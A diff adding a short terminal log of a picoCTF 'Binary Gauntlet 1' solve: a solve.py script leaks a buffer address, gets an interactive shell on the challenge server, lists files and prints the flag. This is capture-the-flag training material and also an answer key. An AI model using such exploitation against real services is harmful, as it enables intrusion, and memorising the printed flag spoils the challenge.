@@ -1,0 +1,16 @@
+┌─[cristian@Prestige-13-AI]─[~/Documentos/picoCTF/27/Binary Gauntlet 1]
+└──╼ $ python3 solve.py           
+[+] Opening connection to wily-courier.picoctf.net on port 65399: Done
+[*] buffer leak = 0x7ffdf2040f20
+[*] Switching to interactive mode
+A
+$ ls
+Dockerfile
+Makefile
+Solution
+flag.txt
+gauntlet
+gauntlet.c
+start.sh
+$ cat flag.txt
+19bcfb848e361b5c7d4ae499afde8465
